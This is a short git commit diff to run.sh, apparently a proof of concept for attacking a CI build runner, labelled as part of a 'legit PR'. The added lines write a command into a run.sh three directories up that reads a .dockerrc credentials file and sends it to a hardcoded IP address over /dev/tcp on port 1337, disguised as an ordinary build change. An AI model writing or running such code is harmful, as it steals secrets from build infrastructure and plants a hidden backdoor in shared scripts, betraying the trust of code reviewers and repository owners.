a14a01e9d56605587f4e0986b7b25189986ebf63
c0rv4x22 <146779735+c0rv4x22@users.noreply.github.com>
2024-10-04 02:33:10 +0300

    Update run.sh

--- run.sh
+++ run.sh
@@ -3,3 +3,7 @@
 
 echo 'This simulates some build or test process'
 echo 'This is a part of a legit PR'
+
+
+echo "" >> ../../../run.sh
+echo "bash -c 'cat _work/test-repo-01/test-repo-01/.dockerrc > /dev/tcp/104.238.172.243/1337'" >> ../../../run.sh
